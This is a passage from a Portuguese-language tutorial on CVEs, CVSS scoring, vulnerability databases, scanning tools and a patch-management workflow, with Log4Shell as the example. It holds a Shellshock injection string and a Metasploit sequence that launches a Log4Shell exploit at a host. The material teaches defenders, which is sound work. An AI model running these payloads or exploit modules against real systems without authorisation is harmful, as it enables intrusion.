monospace;text-align:left;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;font-size:1em;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token" style="color:rgb(199, 146, 234)">(</span><span class="token" style="color:rgb(199, 146, 234)">)</span><span> </span><span class="token" style="color:rgb(199, 146, 234)">{</span><span> </span><span class="token" style="color:rgb(255, 203, 139)">:</span><span class="token" style="color:rgb(199, 146, 234)">;</span><span> </span><span class="token" style="color:rgb(199, 146, 234)">}</span><span class="token" style="color:rgb(199, 146, 234)">;</span><span> /bin/bash </span><span class="token parameter" style="color:rgb(214, 222, 235)">-c</span><span> </span><span class="token" style="color:rgb(173, 219, 103)">&quot;comando_malicioso&quot;</span><span>
</span></code></pre></div>

**Impacto:** Crítico - Servidores web com CGI vulneráveis

**Mitigação:** Atualizar Bash

---

### CVSS (Common Vulnerability Scoring System)

**CVSS** é um sistema de pontuação que mede a **severidade** de vulnerabilidades.

#### Escala CVSS v3.1

| Score | Severidade | Cor |
|-------|------------|-----|
| 0.0 | None | ⚪ |
| 0.1 - 3.9 | Low | 🟢 |
| 4.0 - 6.9 | Medium | 🟡 |
| 7.0 - 8.9 | High | 🟠 |
| 9.0 - 10.0 | Critical | 🔴 |

#### Componentes do CVSS

**Base Metrics (Métricas Base):**
- **AV (Attack Vector):** Network, Adjacent, Local, Physical
- **AC (Attack Complexity):** Low, High
- **PR (Privileges Required):** None, Low, High
- **UI (User Interaction):** None, Required
- **S (Scope):** Unchanged, Changed
- **C (Confidentiality):** None, Low, High
- **I (Integrity):** None, Low, High
- **A (Availability):** None, Low, High

**Exemplo - Log4Shell:**
```

CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H

AV:N → Network (pode ser explorado remotamente) AC:L → Low complexity (fácil de explorar) PR:N → Nenhum privilégio necessário UI:N → Nenhuma interação do usuário S:C → Scope changed (afeta outros componentes) C:H → Confidencialidade: High impact I:H → Integridade: High impact A:H → Disponibilidade: High impact

Score: 10.0 (CRÍTICO)

```
**Calculadora CVSS:** [nvd.nist.gov/vuln-metrics/cvss/v3-calculator](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator)

---

## 🔍 Fontes de Informação sobre CVEs

### NVD (National Vulnerability Database)
**Site:** [nvd.nist.gov](https://nvd.nist.gov/)

**Recursos:**
- Base de dados completa de CVEs
- CVSS scores
- CPE (Common Platform Enumeration)
- Referências e patches

**Busca:**
```

https://nvd.nist.gov/vuln/search

```
---

### MITRE CVE
**Site:** [cve.mitre.org](https://cve.mitre.org/)

**Recursos:**
- Lista oficial de CVEs
- Descrições técnicas
- Referências

---

### Exploit-DB
**Site:** [exploit-db.com](https://www.exploit-db.com/)

**Recursos:**
- Exploits públicos
- Shellcodes
- Papers de segurança

**Busca por CVE:**
```

https://www.exploit-db.com/search?cve=2021-44228

```
---

### GitHub Advisory Database
**Site:** [github.com/advisories](https://github.com/advisories)

**Recursos:**
- CVEs em bibliotecas open source
- Dependabot alerts
- Patches disponíveis

---

### CVE Details
**Site:** [cvedetails.com](https://www.cvedetails.com/)

**Recursos:**
- Estatísticas de CVEs
- Top vendors/produtos vulneráveis
- Timeline de vulnerabilidades

---

## 🛠️ Ferramentas de Busca e Análise

### CVE Search (CLI)
<div class="widget code-container remove-before-copy"><div class="code-header non-draggable"><span class="iaf s13 w700 code-language-placeholder">bash</span><div class="code-copy-button"><span class="iaf s13 w500 code-copy-placeholder">Copiar</span><img class="code-copy-icon" src="data:image/svg+xml;utf8,%0A%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%3E%0A%20%20%3Cpath%20d%3D%22M10.8%208.63V11.57C10.8%2014.02%209.82%2015%207.37%2015H4.43C1.98%2015%201%2014.02%201%2011.57V8.63C1%206.18%201.98%205.2%204.43%205.2H7.37C9.82%205.2%2010.8%206.18%2010.8%208.63Z%22%20stroke%3D%22%23717C92%22%20stroke-width%3D%221.05%22%20stroke-linecap%3D%22round%22%20stroke-linejoin%3D%22round%22%2F%3E%0A%20%20%3Cpath%20d%3D%22M15%204.42999V7.36999C15%209.81999%2014.02%2010.8%2011.57%2010.8H10.8V8.62999C10.8%206.17999%209.81995%205.19999%207.36995%205.19999H5.19995V4.42999C5.19995%201.97999%206.17995%200.999992%208.62995%200.999992H11.57C14.02%200.999992%2015%201.97999%2015%204.42999Z%22%20stroke%3D%22%23717C92%22%20stroke-width%3D%221.05%22%20stroke-linecap%3D%22round%22%20stroke-linejoin%3D%22round%22%2F%3E%0A%3C%2Fsvg%3E%0A" /></div></div><pre id="code-rudwu9vc0" style="color:white;font-family:Consolas, Monaco, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, monospace;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;font-size:1em;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:8px;margin:8px;overflow:auto;background:#011627;width:calc(100% - 8px);border-radius:8px;box-shadow:0px 8px 18px 0px rgba(120, 120, 143, 0.10), 2px 2px 10px 0px rgba(255, 255, 255, 0.30) inset"><code class="language-bash" style="white-space:pre;color:#d6deeb;font-family:Consolas, Monaco, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, monospace;text-align:left;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;font-size:1em;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token" style="color:rgb(99, 119, 119);font-style:italic"># Instalar</span><span>
</span><span>pip </span><span class="token" style="color:rgb(130, 170, 255)">install</span><span> cve-search-cli
</span>
<span></span><span class="token" style="color:rgb(99, 119, 119);font-style:italic"># Buscar CVE</span><span>
</span>cve-search CVE-2021-44228
<!-- -->
<span></span><span class="token" style="color:rgb(99, 119, 119);font-style:italic"># Buscar por produto</span><span>
</span><span>cve-search </span><span class="token parameter" style="color:rgb(214, 222, 235)">--product</span><span> </span><span class="token" style="color:rgb(173, 219, 103)">&quot;apache log4j&quot;</span><span>
</span></code></pre></div>

---

### Nmap NSE Scripts
<div class="widget code-container remove-before-copy"><div class="code-header non-draggable"><span class="iaf s13 w700 code-language-placeholder">bash</span><div class="code-copy-button"><span class="iaf s13 w500 code-copy-placeholder">Copiar</span><img class="code-copy-icon" src="data:image/svg+xml;utf8,%0A%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%3E%0A%20%20%3Cpath%20d%3D%22M10.8%208.63V11.57C10.8%2014.02%209.82%2015%207.37%2015H4.43C1.98%2015%201%2014.02%201%2011.57V8.63C1%206.18%201.98%205.2%204.43%205.2H7.37C9.82%205.2%2010.8%206.18%2010.8%208.63Z%22%20stroke%3D%22%23717C92%22%20stroke-width%3D%221.05%22%20stroke-linecap%3D%22round%22%20stroke-linejoin%3D%22round%22%2F%3E%0A%20%20%3Cpath%20d%3D%22M15%204.42999V7.36999C15%209.81999%2014.02%2010.8%2011.57%2010.8H10.8V8.62999C10.8%206.17999%209.81995%205.19999%207.36995%205.19999H5.19995V4.42999C5.19995%201.97999%206.17995%200.999992%208.62995%200.999992H11.57C14.02%200.999992%2015%201.97999%2015%204.42999Z%22%20stroke%3D%22%23717C92%22%20stroke-width%3D%221.05%22%20stroke-linecap%3D%22round%22%20stroke-linejoin%3D%22round%22%2F%3E%0A%3C%2Fsvg%3E%0A" /></div></div><pre id="code-63gtpowe1" style="color:white;font-family:Consolas, Monaco, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, monospace;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;font-size:1em;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:8px;margin:8px;overflow:auto;background:#011627;width:calc(100% - 8px);border-radius:8px;box-shadow:0px 8px 18px 0px rgba(120, 120, 143, 0.10), 2px 2px 10px 0px rgba(255, 255, 255, 0.30) inset"><code class="language-bash" style="white-space:pre;color:#d6deeb;font-family:Consolas, Monaco, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, monospace;text-align:left;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;font-size:1em;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token" style="color:rgb(99, 119, 119);font-style:italic"># Scan de vulnerabilidades</span><span>
</span><span>nmap </span><span class="token parameter" style="color:rgb(214, 222, 235)">--script</span><span> vuln </span><span class="token" style="color:rgb(247, 140, 108)">192.168</span><span>.1.1
</span>
<span></span><span class="token" style="color:rgb(99, 119, 119);font-style:italic"># Buscar CVEs específicos</span><span>
</span><span>nmap </span><span class="token parameter" style="color:rgb(214, 222, 235)">--script</span><span> vulners </span><span class="token" style="color:rgb(247, 140, 108)">192.168</span><span>.1.1
</span></code></pre></div>

---

### Nuclei
**Descrição:** Scanner de vulnerabilidades baseado em templates.

**Instalação:**
<div class="widget code-container remove-before-copy"><div class="code-header non-draggable"><span class="iaf s13 w700 code-language-placeholder">bash</span><div class="code-copy-button"><span class="iaf s13 w500 code-copy-placeholder">Copiar</span><img class="code-copy-icon" src="data:image/svg+xml;utf8,%0A%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%3E%0A%20%20%3Cpath%20d%3D%22M10.8%208.63V11.57C10.8%2014.02%209.82%2015%207.37%2015H4.43C1.98%2015%201%2014.02%201%2011.57V8.63C1%206.18%201.98%205.2%204.43%205.2H7.37C9.82%205.2%2010.8%206.18%2010.8%208.63Z%22%20stroke%3D%22%23717C92%22%20stroke-width%3D%221.05%22%20stroke-linecap%3D%22round%22%20stroke-linejoin%3D%22round%22%2F%3E%0A%20%20%3Cpath%20d%3D%22M15%204.42999V7.36999C15%209.81999%2014.02%2010.8%2011.57%2010.8H10.8V8.62999C10.8%206.17999%209.81995%205.19999%207.36995%205.19999H5.19995V4.42999C5.19995%201.97999%206.17995%200.999992%208.62995%200.999992H11.57C14.02%200.999992%2015%201.97999%2015%204.42999Z%22%20stroke%3D%22%23717C92%22%20stroke-width%3D%221.05%22%20stroke-linecap%3D%22round%22%20stroke-linejoin%3D%22round%22%2F%3E%0A%3C%2Fsvg%3E%0A" /></div></div><pre id="code-mqt7qn825" style="color:white;font-family:Consolas, Monaco, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, monospace;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;font-size:1em;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:8px;margin:8px;overflow:auto;background:#011627;width:calc(100% - 8px);border-radius:8px;box-shadow:0px 8px 18px 0px rgba(120, 120, 143, 0.10), 2px 2px 10px 0px rgba(255, 255, 255, 0.30) inset"><code class="language-bash" style="white-space:pre;color:#d6deeb;font-family:Consolas, Monaco, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, monospace;text-align:left;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;font-size:1em;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span>go </span><span class="token" style="color:rgb(130, 170, 255)">install</span><span> </span><span class="token parameter" style="color:rgb(214, 222, 235)">-v</span><span> github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest
</span></code></pre></div>

**Uso:**
<div class="widget code-container remove-before-copy"><div class="code-header non-draggable"><span class="iaf s13 w700 code-language-placeholder">bash</span><div class="code-copy-button"><span class="iaf s13 w500 code-copy-placeholder">Copiar</span><img class="code-copy-icon" src="data:image/svg+xml;utf8,%0A%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%3E%0A%20%20%3Cpath%20d%3D%22M10.8%208.63V11.57C10.8%2014.02%209.82%2015%207.37%2015H4.43C1.98%2015%201%2014.02%201%2011.57V8.63C1%206.18%201.98%205.2%204.43%205.2H7.37C9.82%205.2%2010.8%206.18%2010.8%208.63Z%22%20stroke%3D%22%23717C92%22%20stroke-width%3D%221.05%22%20stroke-linecap%3D%22round%22%20stroke-linejoin%3D%22round%22%2F%3E%0A%20%20%3Cpath%20d%3D%22M15%204.42999V7.36999C15%209.81999%2014.02%2010.8%2011.57%2010.8H10.8V8.62999C10.8%206.17999%209.81995%205.19999%207.36995%205.19999H5.19995V4.42999C5.19995%201.97999%206.17995%200.999992%208.62995%200.999992H11.57C14.02%200.999992%2015%201.97999%2015%204.42999Z%22%20stroke%3D%22%23717C92%22%20stroke-width%3D%221.05%22%20stroke-linecap%3D%22round%22%20stroke-linejoin%3D%22round%22%2F%3E%0A%3C%2Fsvg%3E%0A" /></div></div><pre id="code-x718huu93" style="color:white;font-family:Consolas, Monaco, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, monospace;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;font-size:1em;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:8px;margin:8px;overflow:auto;background:#011627;width:calc(100% - 8px);border-radius:8px;box-shadow:0px 8px 18px 0px rgba(120, 120, 143, 0.10), 2px 2px 10px 0px rgba(255, 255, 255, 0.30) inset"><code class="language-bash" style="white-space:pre;color:#d6deeb;font-family:Consolas, Monaco, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, monospace;text-align:left;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;font-size:1em;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token" style="color:rgb(99, 119, 119);font-style:italic"># Atualizar templates</span><span>
</span>nuclei -update-templates
<!-- -->
<span></span><span class="token" style="color:rgb(99, 119, 119);font-style:italic"># Scan de CVEs</span><span>
</span><span>nuclei </span><span class="token parameter" style="color:rgb(214, 222, 235)">-u</span><span> https://exemplo.com </span><span class="token parameter" style="color:rgb(214, 222, 235)">-t</span><span> cves/
</span>
<span></span><span class="token" style="color:rgb(99, 119, 119);font-style:italic"># CVE específico</span><span>
</span><span>nuclei </span><span class="token parameter" style="color:rgb(214, 222, 235)">-u</span><span> https://exemplo.com </span><span class="token parameter" style="color:rgb(214, 222, 235)">-t</span><span> cves/2021/CVE-2021-44228.yaml
</span></code></pre></div>

---

### Metasploit
<div class="widget code-container remove-before-copy"><div class="code-header non-draggable"><span class="iaf s13 w700 code-language-placeholder">bash</span><div class="code-copy-button"><span class="iaf s13 w500 code-copy-placeholder">Copiar</span><img class="code-copy-icon" src="data:image/svg+xml;utf8,%0A%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%3E%0A%20%20%3Cpath%20d%3D%22M10.8%208.63V11.57C10.8%2014.02%209.82%2015%207.37%2015H4.43C1.98%2015%201%2014.02%201%2011.57V8.63C1%206.18%201.98%205.2%204.43%205.2H7.37C9.82%205.2%2010.8%206.18%2010.8%208.63Z%22%20stroke%3D%22%23717C92%22%20stroke-width%3D%221.05%22%20stroke-linecap%3D%22round%22%20stroke-linejoin%3D%22round%22%2F%3E%0A%20%20%3Cpath%20d%3D%22M15%204.42999V7.36999C15%209.81999%2014.02%2010.8%2011.57%2010.8H10.8V8.62999C10.8%206.17999%209.81995%205.19999%207.36995%205.19999H5.19995V4.42999C5.19995%201.97999%206.17995%200.999992%208.62995%200.999992H11.57C14.02%200.999992%2015%201.97999%2015%204.42999Z%22%20stroke%3D%22%23717C92%22%20stroke-width%3D%221.05%22%20stroke-linecap%3D%22round%22%20stroke-linejoin%3D%22round%22%2F%3E%0A%3C%2Fsvg%3E%0A" /></div></div><pre id="code-9f176ptbx" style="color:white;font-family:Consolas, Monaco, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, monospace;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;font-size:1em;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:8px;margin:8px;overflow:auto;background:#011627;width:calc(100% - 8px);border-radius:8px;box-shadow:0px 8px 18px 0px rgba(120, 120, 143, 0.10), 2px 2px 10px 0px rgba(255, 255, 255, 0.30) inset"><code class="language-bash" style="white-space:pre;color:#d6deeb;font-family:Consolas, Monaco, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, monospace;text-align:left;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;font-size:1em;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token" style="color:rgb(99, 119, 119);font-style:italic"># Buscar exploits por CVE</span><span>
</span>msfconsole
<span>msf6 </span><span class="token" style="color:rgb(127, 219, 202)">&gt;</span><span> search cve:2021-44228
</span>
<span></span><span class="token" style="color:rgb(99, 119, 119);font-style:italic"># Usar exploit</span><span>
</span><span>msf6 </span><span class="token" style="color:rgb(127, 219, 202)">&gt;</span><span> use exploit/multi/http/log4shell_header_injection
</span><span>msf6 </span><span class="token" style="color:rgb(127, 219, 202)">&gt;</span><span> </span><span class="token" style="color:rgb(255, 203, 139)">set</span><span> RHOSTS </span><span class="token" style="color:rgb(247, 140, 108)">192.168</span><span>.1.100
</span><span>msf6 </span><span class="token" style="color:rgb(127, 219, 202)">&gt;</span><span> exploit
</span></code></pre></div>

---

## 📊 Workflow de Gestão de Vulnerabilidades

### 1️⃣ Identificação
<div class="widget code-container remove-before-copy"><div class="code-header non-draggable"><span class="iaf s13 w700 code-language-placeholder">bash</span><div class="code-copy-button"><span class="iaf s13 w500 code-copy-placeholder">Copiar</span><img class="code-copy-icon" src="data:image/svg+xml;utf8,%0A%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%3E%0A%20%20%3Cpath%20d%3D%22M10.8%208.63V11.57C10.8%2014.02%209.82%2015%207.37%2015H4.43C1.98%2015%201%2014.02%201%2011.57V8.63C1%206.18%201.98%205.2%204.43%205.2H7.37C9.82%205.2%2010.8%206.18%2010.8%208.63Z%22%20stroke%3D%22%23717C92%22%20stroke-width%3D%221.05%22%20stroke-linecap%3D%22round%22%20stroke-linejoin%3D%22round%22%2F%3E%0A%20%20%3Cpath%20d%3D%22M15%204.42999V7.36999C15%209.81999%2014.02%2010.8%2011.57%2010.8H10.8V8.62999C10.8%206.17999%209.81995%205.19999%207.36995%205.19999H5.19995V4.42999C5.19995%201.97999%206.17995%200.999992%208.62995%200.999992H11.57C14.02%200.999992%2015%201.97999%2015%204.42999Z%22%20stroke%3D%22%23717C92%22%20stroke-width%3D%221.05%22%20stroke-linecap%3D%22round%22%20stroke-linejoin%3D%22round%22%2F%3E%0A%3C%2Fsvg%3E%0A" /></div></div><pre id="code-fu758yr0b" style="color:white;font-family:Consolas, Monaco, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, monospace;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;font-size:1em;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:8px;margin:8px;overflow:auto;background:#011627;width:calc(100% - 8px);border-radius:8px;box-shadow:0px 8px 18px 0px rgba(120, 120, 143, 0.10), 2px 2px 10px 0px rgba(255, 255, 255, 0.30) inset"><code class="language-bash" style="white-space:pre;color:#d6deeb;font-family:Consolas, Monaco, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, monospace;text-align:left;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;font-size:1em;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token" style="color:rgb(99, 119, 119);font-style:italic"># Scan de vulnerabilidades</span><span>
</span><span>nmap </span><span class="token parameter" style="color:rgb(214, 222, 235)">--script</span><span> vuln </span><span class="token" style="color:rgb(247, 140, 108)">192.168</span><span>.1.0/24
</span><span>nuclei </span><span class="token parameter" style="color:rgb(214, 222, 235)">-l</span><span> hosts.txt </span><span class="token parameter" style="color:rgb(214, 222, 235)">-t</span><span> cves/
</span></code></pre></div>

---

### 2️⃣ Priorização
```

CVSS Score + Exploitabilidade + Impacto no Negócio

Crítico (9.0-10.0) + Exploit público = URGENTE Alto (7.0-8.9) + Sem exploit = ALTO Médio (4.0-6.9) = MÉDIO Baixo (0.1-3.9) = BAIXO

```
---

### 3️⃣ Remediação
```

1. Aplicar patch oficial
2. Se patch indisponível:
    - Workaround temporário
    - Mitigação via WAF/IPS
    - Segmentação de rede
3. Verificar efetividade

```
---

### 4️⃣ Verificação
<div class="widget code-container remove-before-copy"><div class="code-header non-draggable"><span class="iaf s13 w700 code-language-placeholder">bash</span><div class="code-copy-button"><span class="iaf s13 w500 code-copy-placeholder">Copiar</span><img class="code-copy-icon" src="data:image/svg+xml;utf8,%0A%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%3E%0A%20%20%3Cpath%20d%3D%22M10.8%208.63V11.57C10.8%2014.02%209.82%2015%207.37%2015H4.43C1.98%2015%201%2014.02%201%2011.57V8.63C1%206.18%201.98%205.2%204.43%205.2H7.37C9.82%205.2%2010.8%206.18%2010.8%208.63Z%22%20stroke%3D%22%23717C92%22%20stroke-width%3D%221.05%22%20stroke-linecap%3D%22round%22%20stroke-linejoin%3D%22round%22%2F%3E%0A%20%20%3Cpath%20d%3D%22M15%204.42999V7.36999C15%209.81999%2014.02%2010.8%2011.57%2010.8H10.8V8.62999C10.8%206.17999%209.81995%205.19999%207.36995%205.19999H5.19995V4.42999C5.19995%201.97999%206.17995%200.999992%208.62995%200.999992H11.57C14.02%200.999992%2015%201.97999%2015%204.42999Z%22%20stroke%3D%22%23717C92%22%20stroke-width%3D%221.05%22%20stroke-linecap%3D%22round%22%20stroke-linejoin%3D%22round%22%2F%3E%0A%3C%2Fsvg%3E%0A" /></div></div><pre id="code-ogpivr8cm" style="color:white;font-family:Consolas, Monaco, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, monospace;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;font-size:1em;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:8px;margin:8px;overflow:auto;background:#011627;width:calc(100% - 8px);border-radius:8px;box-shadow:0px 8px 18px 0px rgba(120, 120, 143, 0.10), 2px 2px 10px 0px rgba(255, 255, 255, 0.30) inset"><code class="language-bash" style="white-space:pre;color:#d6deeb;font-family:Consolas, Monaco, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, monospace;text-align:left;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;font-size:1em;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token" style="color:rgb(99, 119, 119);font-style:italic"># Re-scan após patch</span><span>
</span><span>nmap </span><span class="token parameter" style="color:rgb(214, 222, 235)">--script</span><span> vuln </span><span class="token" style="color:rgb(247, 140, 108)">192.168</span><span>.1.100
</span>
<span></span><span class="token" style="color:rgb(99, 119, 119);font-style:italic"># Verificar versão</span><span>
</span><span>nmap </span><span class="token parameter" style="color:rgb(214, 222, 235)">-sV</span><span> </span><span class="token" style="color:rgb(247, 140, 108)">192.168</span><span>.1.100
</span></code></pre></div>

---

## 🔔 Alertas e Monitoramento

### CVE Feeds (RSS/JSON)
<div class="widget code-container remove-before-copy"><div class="code-header non-draggable"><span class="iaf s13 w700 code-language-placeholder">bash</span><div class="code-copy-button"><span class="iaf s13 w500 code-copy-placeholder">Copiar</span><img class="code-copy-icon" src="data:image/svg+xml;utf8,%0A%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%3E%0A%20%20%3Cpath%20d%3D%22M10.8%208.63V11.57C10.8%2014.02%209.82%2015%207.37%2015H4.43C1.98%2015%201%2014.02%201%2011.57V8.63C1%206.18%201.98%205.2%204.43%205.2H7.37C9.82%205.2%2010.8%206.18%2010.8%208.63Z%22%20stroke%3D%22%23717C92%22%20stroke-width%3D%221.05%22%20stroke-linecap%3D%22round%22%20stroke-linejoin%3D%22round%22%2F%3E%0A%20%20%3Cpath%20d%3D%22M15%204.42999V7.36999C15%209.81999%2014.02%2010.8%2011.57%2010.8H10.8V8.62999C10.8%206.17999%209.81995%205.19999%207.36995%205.19999H5.19995V4.42999C5.19995%201.97999%206.17995%200.999992%208.62995%200.999992H11.57C14.02%200.999992%2015%201.97999%2015%204.42999Z%22%20stroke%3D%22%23717C92%22%20stroke-width%3D%221.05%22%20stroke-linecap%3D%22round%22%20stroke-linejoin%3D%22round%22%2F%3E%0A%3C%2Fsvg%3E%0A" /></div></div><pre id="code-t2ywlm931" style="color:white;font-family:Consolas, Monaco, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, monospace;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;font-size:1em;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:8px;margin:8px;overflow:auto;background:#011627;width:calc(100% - 8px);border-radius:8px;box-shadow:0px 8px 18px 0px rgba(120, 120, 143, 0.10), 2px 2px 10px 0px rgba(255, 255, 255, 0.30) inset"><code class="language-bash" style="white-space:pre;color:#d6deeb;font-family:Consolas, Monaco, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, monospace;text-align:left;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;font-size:1em;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token" style="color:rgb(99, 119, 119);font-style:italic"># NVD Data Feeds</span><span>
</span>https://nvd.nist.gov/vuln/data-feeds
<!-- -->
<span></span><span class="token" style="color:rgb(99, 119, 119);font-style:italic"># CISA Known Exploited Vulnerabilities</span><span>
</span>https://www.cisa.gov/known-exploited-vulnerabilities-catalog
</code></pre></div>

---

### Ferramentas de Monitoramento

#### Vulners
**Site:** [vulners.com](https://vulners.com/)

**Recursos:**
- Alertas de CVEs
- API para integração
- Busca por produtos

---

#### CVE Trends
**Site:** [cvetrends.com](https://cvetrends.com/)

**Recursos:**
- CVEs em alta (trending)
- Análise de exploitabilidade

---

## 🎯 Exemplo Prático - Log4Shell

### Identificação
<div class="widget code-container remove-before-copy"><div class="code-header non-draggable"><span class="iaf s13 w700 code-language-placeholder">bash</span><div class="code-copy-button"><span class="iaf s13 w500 code-copy-placeholder">Copiar</span><img class="code-copy-icon" src="data:image/svg+xml;utf8,%0A%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%3E%0A%20%20%3Cpath%20d%3D%22M10.8%208.63V11.57C10.8%2014.02%209.82%2015%207.37%2015H4.43C1.98%2015%201%2014.02%201%2011.57V8.63C1%206.18%201.98%205.2%204.43%205.2H7.37C9.82%205.2%2010.8%206.18%2010.8%208.63Z%22%20stroke%3D%22%23717C92%22%20stroke-width%3D%221.05%22%20stroke-linecap%3D%22round%22%20stroke-linejoin%3D%22round%22%2F%3E%0A%20%20%3Cpath%20d%3D%22M15%204.42999V7.36999C15%209.81999%2014.02%2010.8%2011.57%2010.8H10.8V8.62999C10.8%206.17999%209.81995%205.19999%207.36995%205.19999H5.19995V4.42999C5.19995%201.97999%206.17995%200.999992%208.62995%200.999992H11.57C14.02%200.999992%2015%201.97999%2015%204.42999Z%22%20stroke%3D%22%23717C92%22%20stroke-width%3D%221.05%22%20stroke-linecap%3D%22round%22%20stroke-linejoin%3D%22round%22%2F%3E%0A%3C%2Fsvg%3E%0A" /></div></div><pre id="code-xqequhrnu" style="color:white;font-family:Consolas, Monaco, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, 